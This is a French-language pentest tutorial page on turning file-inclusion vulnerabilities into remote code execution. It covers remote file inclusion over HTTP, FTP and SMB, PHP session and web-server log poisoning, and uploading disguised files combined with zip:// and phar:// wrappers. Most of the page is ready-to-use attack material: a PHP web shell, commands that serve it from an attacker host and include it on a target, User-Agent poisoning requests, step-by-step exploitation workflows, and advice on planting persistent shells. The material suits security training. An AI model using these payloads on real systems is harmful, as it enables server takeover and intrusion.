# Exécution de code à distance

Une vulnérabilité d'inclusion de fichiers ne se limite pas à la lecture de fichiers sensibles. Dans de nombreux cas, elle permet d'exécuter du code arbitraire sur le serveur cible. Plusieurs vecteurs existent pour y parvenir : l'inclusion de fichiers distants (RFI), l'empoisonnement de journaux (log poisoning), ou encore l'exploitation combinée d'un upload de fichiers avec une LFI. Cette page couvre l'ensemble de ces techniques.

## Pourquoi

Lire `/etc/passwd` confirme la vulnérabilité, mais l'objectif en pentest est souvent d'obtenir une exécution de commandes. Passer de la lecture de fichiers à l'exécution de code transforme une vulnérabilité moyenne en compromission complète du serveur. Chaque technique présentée ici répond à des conditions différentes, ce qui permet de s'adapter aux configurations rencontrées.

## Comment ça marche

### Inclusion de fichiers distants (RFI)

#### LFI vs RFI

Toute fonction vulnérable à une RFI est aussi vulnérable à une LFI, mais l'inverse n'est pas vrai. Trois raisons principales empêchent une LFI de devenir une RFI :

1. La fonction vulnérable n'accepte pas les URLs distantes
2. On ne contrôle qu'une partie du chemin, pas le schéma de protocole (`http://`, `ftp://`)
3. La configuration serveur bloque l'inclusion distante (c'est le cas par défaut)

Voici les fonctions qui supportent les URLs distantes :

| Fonction | Lecture | Exécution | URL distante |
|---|:---:|:---:|:---:|
| **PHP** | | | |
| `include()` / `include_once()` | Oui | Oui | Oui |
| `file_get_contents()` | Oui | Non | Oui |
| **Java** | | | |
| `import` | Oui | Oui | Oui |
| **.NET** | | | |
| `@Html.RemotePartial()` | Oui | Non | Oui |
| `include` | Oui | Oui | Oui |

#### Vérifier la faisabilité d'une RFI

En PHP, l'inclusion distante nécessite que `allow_url_include` soit activé. On peut vérifier ce paramètre en lisant la configuration PHP via la LFI elle-même :

```bash
# - Extraire php.ini via le filtre base64
curl "http://<IP_CIBLE>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep allow_url_include
```

```
allow_url_include = On
```

Même si le paramètre est activé, il vaut mieux tester directement. On commence toujours par inclure une URL locale pour éviter les blocages réseau :

```
http://<IP_CIBLE>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

Si la page s'affiche normalement (le contenu est rendu, pas affiché en texte brut), la RFI est confirmée et la fonction exécute le code PHP.

{% hint style="warning" %}
Ne pas inclure la page vulnérable elle-même (index.php → index.php), cela risque de créer une boucle d'inclusion récursive et de provoquer un déni de service sur le serveur.
{% endhint %}

#### RCE via HTTP

On crée un web shell minimal et on le sert depuis notre machine d'attaque :

```bash
# - Créer le shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# - Servir le fichier
sudo python3 -m http.server 80
```

Ensuite, on l'inclut via la RFI :

```
http://<IP_CIBLE>:<PORT>/index.php?language=http://<IP_ATTAQUANT>/shell.php&cmd=id
```

```bash
# - Variante avec cURL
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=http://<IP_ATTAQUANT>/shell.php&cmd=id"
```

{% hint style="success" %}
Utiliser les ports 80 ou 443 pour le serveur HTTP. Ces ports sont souvent autorisés dans les règles de pare-feu, contrairement aux ports non standard.
{% endhint %}

#### RCE via FTP

Si les URLs HTTP sont bloquées par un WAF ou un pare-feu, le protocole FTP constitue une alternative. On lance un serveur FTP avec `pyftpdlib` :

```bash
sudo python -m pyftpdlib -p 21
```

L'inclusion utilise le schéma `ftp://` :

```
http://<IP_CIBLE>:<PORT>/index.php?language=ftp://<IP_ATTAQUANT>/shell.php&cmd=id
```

Si le serveur FTP exige une authentification :

```bash
curl "http://<IP_CIBLE>:<PORT>/index.php?language=ftp://user:pass@<IP_ATTAQUANT>/shell.php&cmd=id"
```

#### RCE via SMB (Windows)

Sur un serveur Windows, le protocole SMB permet l'inclusion distante sans que `allow_url_include` soit activé. Windows traite les fichiers sur un partage SMB distant comme des fichiers locaux via un chemin UNC.

```bash
# - Lancer un serveur SMB avec Impacket
impacket-smbserver -smb2support share $(pwd)
```

L'inclusion utilise un chemin UNC :

```
http://<IP_CIBLE>:<PORT>/index.php?language=\\<IP_ATTAQUANT>\share\shell.php&cmd=whoami
```

{% hint style="info" %}
Cette technique fonctionne surtout quand l'attaquant et la cible sont sur le même réseau. L'accès SMB depuis Internet est généralement bloqué par la configuration Windows par défaut.
{% endhint %}

---

### Empoisonnement de journaux (Log Poisoning)

Le principe est simple : écrire du code PHP dans un champ que l'on contrôle et qui est enregistré dans un fichier de log, puis inclure ce fichier via la LFI pour déclencher l'exécution.

{% hint style="danger" %}
Les fichiers de log peuvent être volumineux. Les charger via une LFI peut ralentir le serveur ou le faire crasher. En environnement de production, utiliser cette technique avec précaution et limiter les requêtes inutiles.
{% endhint %}

#### Empoisonnement de session PHP

La plupart des applications PHP utilisent un cookie `PHPSESSID`. Les données de session sont stockées dans un fichier sur le serveur :

- **Linux** : `/var/lib/php/sessions/sess_<PHPSESSID>`
- **Windows** : `C:\Windows\Temp\sess_<PHPSESSID>`

**Étape 1 : Inspecter le fichier de session**

On récupère la valeur du cookie PHPSESSID (visible dans les outils développeur du navigateur, onglet Stockage), puis on l'inclut via la LFI :

```
http://<IP_CIBLE>:<PORT>/index.php?language=/var/lib/php/sessions/sess_abc123def456
```

Le contenu révèle les variables de session. Si l'une d'elles reprend un paramètre qu'on contrôle (par exemple, le paramètre `language` stocké dans la variable `page`), on peut l'empoisonner.

**Étape 2 : Empoisonner la session**

On injecte un web shell PHP dans le paramètre contrôlé, en URL-encodant le payload :

```
http://<IP_CIBLE>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**Étape 3 : Exécuter des commandes**

On inclut à nouveau le fichier de session, cette fois avec le paramètre de commande :

```
http://<IP_CIBLE>:<PORT>/index.php?language=/var/lib/php/sessions/sess_abc123def456&cmd=id
```

{% hint style="warning" %}
Le fichier de session est écrasé à chaque requête. Après avoir exécuté une commande, il faut ré-empoisonner la session. En pratique, on utilise cette première exécution pour écrire un web shell persistant dans le répertoire web.
{% endhint %}

#### Empoisonnement des logs serveur

Les serveurs Apache et Nginx enregistrent chaque requête dans des fichiers de log, incluant le header `User-Agent`. Ce header est entièrement contrôlé par le client.

**Chemins des logs courants :**

| Serveur | Linux | Windows |
|---|---|---|
| Apache | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\access.log` |
| Nginx | `/var/log/nginx/access.log` | `C:\nginx\log\access.log` |

{% hint style="info" %}
Les logs Nginx sont lisibles par `www-data` par défaut. Les logs Apache nécessitent généralement des privilèges élevés (`root` ou groupe `adm`), sauf sur des serveurs mal configurés.
{% endhint %}

**Vérifier l'accès aux logs :**

```
http://<IP_CIBLE>:<PORT>/index.php?language=/var/log/apache2/access.log
```

Si le contenu du log s'affiche, on peut voir le User-Agent dans les entrées.

**Empoisonner le log via cURL :**

```bash
# - Injecter un web shell dans le User-Agent
curl -s "http://<IP_CIBLE>:<PORT>/index.php" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

**Exécuter des commandes :**

```
http://<IP_CIBLE>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Autres fichiers de log exploitables :**

| Fichier | Champ contrôlé |
|---|---|
| `/var/log/sshd.log` | Nom d'utilisateur SSH |
| `/var/log/mail` | Contenu de l'email |
| `/var/log/vsftpd.log` | Nom d'utilisateur FTP |
| `/proc/self/environ` | Variables d'environnement (User-Agent) |
| `/proc/self/fd/N` | Descripteurs de fichiers (N entre 0 et 50) |

Pour SSH et FTP, on tente une connexion avec un nom d'utilisateur contenant du code PHP. Pour le mail, on envoie un email contenant du PHP au serveur. Le principe reste le même : injecter, puis inclure.

---

### LFI combinée avec l'upload de fichiers

Si l'application web propose une fonctionnalité d'upload (avatar, documents), on peut combiner cet upload avec la LFI pour exécuter du code, même si l'upload en lui-même n'est pas vulnérable. La seule condition : la fonction d'inclusion doit avoir la capacité d'exécuter le code.

#### Upload d'image malveillante

On crée un fichier qui ressemble à une image mais contient du code PHP :

```bash
# - Le préfixe GIF8 satisfait la vérification des magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

On upload ce fichier via la fonctionnalité d'avatar ou d'upload de l'application. Ensuite, on identifie le chemin du fichier uploadé (souvent visible dans le code source de la page ou devinable via fuzzing) :

```html
<img src="/profile_images/shell.gif" class="profile-image">
```

On inclut le fichier via la LFI :

```
http://<IP_CIBLE>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

{% hint style="success" %}
Cette technique est la plus fiable car elle fonctionne avec la plupart des frameworks web. Les wrappers zip et phar ci-dessous sont des alternatives spécifiques à PHP.
{% endhint %}

#### Wrapper zip://

On crée une archive ZIP contenant un web shell PHP, renommée avec une extension d'image :

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```

Après upload de `shell.jpg`, on l'inclut avec le wrapper `zip://`. Le `#` (encodé en `%23`) sépare le chemin de l'archive du fichier interne :

```
http://<IP_CIBLE>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

{% hint style="warning" %}
Certains formulaires d'upload détectent le type réel du fichier (content-type). Une archive ZIP renommée en .jpg peut être rejetée. Cette technique a plus de chances de fonctionner si l'upload d'archives est autorisé.
{% endhint %}

#### Wrapper phar://

Le wrapper `phar://` permet d'accéder à des fichiers dans une archive PHP (PHAR). On crée d'abord un script qui génère l'archive :

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

On compile et renomme :

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Après upload, l'inclusion utilise le wrapper `phar://` avec le sous-fichier séparé par `/` (encodé en `%2F`) :

```
http://<IP_CIBLE>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## En pratique

### Workflow complet d'exploitation RFI

Depuis un conteneur Exegol :

```bash
# 1 - Vérifier allow_url_include
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d | grep allow_url_include

# 2 - Tester la RFI locale
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=http://127.0.0.1:<PORT>/index.php"

# 3 - Préparer et servir le shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 80

# 4 - Exploiter (dans un autre terminal)
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=http://<IP_ATTAQUANT>/shell.php&cmd=id"
```

### Workflow log poisoning

```bash
# 1 - Vérifier l'accès aux logs
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=/var/log/apache2/access.log" | head -5

# 2 - Empoisonner le User-Agent
curl -s "http://<IP_CIBLE>:<PORT>/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 3 - Exécuter des commandes
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=whoami"
```

### Workflow upload + LFI

```bash
# 1 - Créer l'image malveillante
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# 2 - Uploader via l'interface web ou cURL
curl -s -F "file=@shell.gif" "http://<IP_CIBLE>:<PORT>/upload.php"

# 3 - Inclure et exécuter
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
```

## Pièges et galères

{% tabs %}
{% tab title="RFI" %}
- **allow_url_include désactivé** : c'est le cas par défaut. Toujours vérifier avant de tenter une RFI. Si c'est désactivé, passer directement aux autres techniques
- **Extension ajoutée automatiquement** : si le serveur ajoute `.php` au paramètre, l'URL distante devient `http://attaquant/shell.php.php`. Observer les requêtes reçues sur le serveur pour adapter le nom du fichier
- **Pare-feu bloquant HTTP sortant** : tester FTP, puis SMB (Windows). Certains pare-feu ne filtrent pas ces protocoles
- **La page s'affiche en texte brut** : la fonction ne fait que lire, pas exécuter. Vérifier le tableau des fonctions
{% endtab %}
{% tab title="Log Poisoning" %}
- **Permissions insuffisantes** : les logs Apache nécessitent souvent `root`. Tenter les logs Nginx, ou `/proc/self/environ` en alternative
- **Log trop volumineux** : sur un serveur en production, le fichier access.log peut faire des centaines de Mo. Le serveur peut timeout ou crasher
- **Payload corrompu** : si plusieurs requêtes empoisonnent le log, les payloads peuvent interférer entre eux. Garder le web shell simple
- **Session écrasée** : le fichier de session est réécrit à chaque requête. Profiter de la première exécution pour poser un shell persistant
{% endtab %}
{% tab title="Upload + LFI" %}
- **Chemin d'upload inconnu** : fuzzer les répertoires courants (`/uploads/`, `/profile_images/`, `/tmp/`). Parfois le chemin est révélé dans le code source ou les headers de réponse
- **Vérification du contenu** : les magic bytes `GIF8` passent la plupart des contrôles basiques, mais pas les validations approfondies (getimagesize, etc.)
- **zip:// et phar:// désactivés** : ces wrappers ne sont pas toujours disponibles. La technique d'image avec magic bytes reste la plus portable
{% endtab %}
{% endtabs %}

## Retour terrain

La RFI pure est de plus en plus rare en conditions réelles, car `allow_url_include` est désactivé par défaut. En revanche, le log poisoning et surtout la combinaison upload + LFI se rencontrent régulièrement.

Sur un engagement, on commence par tester la RFI (rapide à vérifier), puis on vérifie l'accès aux fichiers de log, et enfin on cherche une fonctionnalité d'upload. L'ordre dépend du contexte : si l'application a un upload d'avatar visible, c'est souvent le chemin le plus direct.

Le wrapper SMB est particulièrement intéressant sur les environnements Windows internes. Il ne nécessite aucune configuration spéciale côté serveur et passe sous le radar de beaucoup de défenses orientées web.

Quand on obtient une première exécution (quelle que soit la technique), la priorité est de poser un web shell persistant dans le répertoire web ou d'obtenir un reverse shell. Les techniques de session poisoning et log poisoning sont fragiles et nécessitent d'être rejouées à chaque commande.

## Mémo express

| Technique | Prérequis | Fiabilité |
|---|---|---|
| RFI HTTP | `allow_url_include = On` | Rare en prod |
| RFI FTP | `allow_url_include = On` | Alternative si HTTP bloqué |
| RFI SMB | Windows, même réseau | Pas besoin de allow_url_include |
| Session poisoning | LFI + paramètre stocké en session | Moyen (session écrasée) |
| Log poisoning Apache | LFI + accès lecture logs Apache | Permissions souvent insuffisantes |
| Log poisoning Nginx | LFI + accès lecture logs Nginx | Meilleur (logs lisibles par www-data) |
| Upload + image | LFI + upload quelconque | Le plus fiable |
| Upload + zip:// | LFI + upload + wrapper zip activé | PHP uniquement |
| Upload + phar:// | LFI + upload + wrapper phar | PHP uniquement |

***
